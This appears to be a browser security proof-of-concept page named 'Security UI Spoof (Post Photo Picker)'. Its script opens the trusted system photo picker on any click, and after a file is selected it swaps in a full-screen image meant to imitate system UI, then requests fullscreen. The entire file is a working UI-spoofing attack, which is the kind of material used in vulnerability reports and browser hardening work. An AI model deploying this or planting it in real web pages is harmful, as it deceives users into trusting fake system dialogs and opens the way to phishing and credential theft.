<!DOCTYPE html>
<html lang="en">
<head>
  <title>Security UI Spoof (Post Photo Picker)</title>
  <meta charset="utf-8">
  <meta name="viewport"
        content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"/>

  <style>
    html, body {
      margin: 0;
      padding: 0;
      width: 100%;
      height: 100%;
      background: #000;
      font-family: system-ui, sans-serif;
    }

    #spoof {
      position: fixed;
      inset: 0;
      width: 100%;
      height: 100%;
      object-fit: cover;
      display: none;
    }

    #content {
      color: white;
      text-align: center;
      margin-top: 40vh;
    }

    input {
      display: none;
    }
  </style>
</head>

<body>

<!-- FOTO SPOOF -->
<img id="spoof" src="spof2.png" alt="spoof-ui">

<div id="content">
  <h1>Click anywhere on the page</h1>
</div>

<!-- ðŸ“¸ Photo Picker -->
<input
  id="photoPicker"
  type="file"
  accept="image/*"
>

<script>
onclick = () => {
  // 1ï¸âƒ£ Trigger trusted system UI (Photo Picker)
  document.getElementById("photoPicker").click();
};

document.getElementById("photoPicker").onchange = () => {
  // 2ï¸âƒ£ Swap UI ke spoof
  document.getElementById("content").style.display = "none";
  document.getElementById("spoof").style.display = "block";

  // 3ï¸âƒ£ Fullscreen
  if (document.documentElement.requestFullscreen) {
    document.documentElement.requestFullscreen().catch(() => {});
  }
};
</script>

</body>
</html>
